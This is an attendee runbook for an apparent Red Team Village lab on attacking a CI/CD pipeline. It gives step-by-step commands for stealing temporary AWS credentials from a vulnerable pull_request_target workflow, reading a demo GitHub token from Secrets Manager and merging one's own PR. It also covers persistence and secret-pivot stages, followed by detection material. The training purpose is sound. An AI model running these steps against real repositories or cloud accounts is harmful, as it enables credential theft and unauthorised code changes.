# Attendee Runbook: Trust the Pipeline, Lose the Kingdom

This is the live Red Team Village lab path. In the room, students run the core exploit live:

```text
PR → STS → demo secret → merge
```

The advanced cloud-native chain is taught with slides, logs, diagrams, and code artifacts during the hour. The public Terraform/code bundle is the take-home reproduction path for running the full chain later in a dedicated, empty AWS account you control.

## Safety contract

Everything in this lab is intentionally vulnerable and intentionally bounded.

- Use only the demo repository, demo AWS account, and handles assigned for this session.
- Do not use personal/work tokens, employer accounts, or real secrets.
- The live room path stops after the trophy-wall merge unless the facilitator explicitly says otherwise.
- Advanced Lambda/EventBridge, IAM graph, and pivot-secret material is shown through artifacts/code in the live hour.
- If your laptop or Wi-Fi fights you, pair with a neighbor and stay with the trust graph. The public bundle lets you rerun later.

## 60-minute map

- 00–10: room contract, safety model, architecture.
- 10–30: live hands-on — PR to merge authority.
- 30–44: advanced chain — slides, logs, code artifacts, diagrams.
- 44–54: detections and defenses.
- 54–60: Terraform/code takeaway, troubleshooting, close.

## Prereqs

You need:

- GitHub account.
- Browser signed into GitHub.
- Terminal with `aws`, `jq`, and `curl` if possible.
- Assigned handle from the room facilitator, for example `student07`.

Set your handle:

```bash
export RTV_HANDLE="student07"
export AWS_REGION="us-east-1"
```

Replace `student07` with your assigned handle.

## Live hands-on: PR to merge authority

### 1. Fork the demo repo

Open the public demo repo URL shown on the room slide and click **Fork**.

### 2. Add your submission

In your fork, create a file named after your assigned handle. Example for `student07`:

```text
submissions/student07.json
```

Example payload:

```json
{
  "handle": "student07",
  "message": "Pipeline proof captured"
}
```

### 3. Open a PR back to the demo repo

Open a pull request from your fork to the room demo repo.

The vulnerable `pull_request_target` workflow runs in the target repository context.

### 4. Read temporary AWS credentials from your workflow log

Open the Actions run for your PR. Find the copy-ready `export` lines and paste them into your terminal.

You should end up with:

```bash
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
export AWS_REGION=us-east-1
```

Verify:

```bash
aws sts get-caller-identity
```

Teaching point:

```text
Temporary means expiring, not unstealable.
```

### 5. Pull the demo GitHub token from Secrets Manager

```bash
export RTV_PAT="$(aws secretsmanager get-secret-value \
  --secret-id demo/github-pat \
  --query SecretString \
  --output text)"
```

Teaching point:

```text
The AWS role is narrow. The secret is not.
```

### 6. Merge your own PR

Set these from the room slide / your PR URL. Replace `8` with your PR number:

```bash
export DEMO_ORG="pipeline-demo-lab"
export DEMO_REPO="cicd-demo"
export PR_NUMBER="8"  # from your PR URL
```

Merge:

```bash
curl -sS -X PUT \
  -H "Authorization: token ${RTV_PAT}" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${DEMO_ORG}/${DEMO_REPO}/pulls/${PR_NUMBER}/merge" | jq .
```

Refresh your PR and the trophy wall.

Key line:

```text
You merged it with a credential that did not exist when you opened the PR.
```

At this point, pause live commands and follow the facilitator through the advanced chain artifacts.

## Advanced chain: taught with artifacts/code

The same trust mistake can continue beyond the live room path. During the session, the facilitator walks through code snippets, pre-captured logs, and diagrams for the rest of the chain.

### Controlled serverless persistence

Artifact/code path:

```bash
./lab/20-deploy-persistence.sh "${RTV_HANDLE}"
```

What the artifact demonstrates:

- handle/session-prefixed Lambda resources;
- a short-lived EventBridge/Scheduler trigger;
- proof output from logs;
- cleanup by session/handle.

Teaching point:

```text
No implant. No endpoint. No C2. Still durable cloud control-plane behavior.
```

### IAM graph walk

Artifact/code path:

```bash
./lab/30-assume-demo-role.sh "${RTV_HANDLE}"
```

What the artifact demonstrates:

- exactly one intended demo role edge;
- denied output for paths outside the lab graph;
- IAM trust policies as graph edges, not isolated policy blobs.

Teaching point:

```text
Trust policies are graph edges. Attackers walk graphs.
```

### Controlled secrets pivot

Artifact/code path:

```bash
./lab/40-read-demo-pivot-secrets.sh "${RTV_HANDLE}"
```

Demo categories:

- `demo/pivot/code-hosting-admin-token`
- `demo/pivot/ci-platform-admin-key`
- `demo/pivot/data-warehouse-creds`
- `demo/pivot/saas-api-key`

These must be fake/demo values only.

Teaching point:

```text
AWS is not the destination. The secret store is the bridge to everything around AWS.
```

## Find yourself in the logs

During the detection section, look for:

- GitHub PR/workflow events;
- `AssumeRoleWithWebIdentity`;
- `GetSecretValue` for the demo PAT;
- Lambda/EventBridge/Scheduler creation from the artifact walkthrough;
- `AssumeRole` graph movement from the artifact walkthrough;
- demo pivot-secret reads from the artifact walkthrough.

Teaching point:

```text
You generated the first pivot live. Now learn how to find the rest of the chain.
```

## Take-home Terraform/code

After the session, use the public bundle to reproduce the environment in an empty AWS account you control:

```text
https://github.com/x90skysn3k/rtv-cicd-attack-chain
```

The live session avoids Terraform so the hour stays focused on the attack graph, not provider downloads and state management.
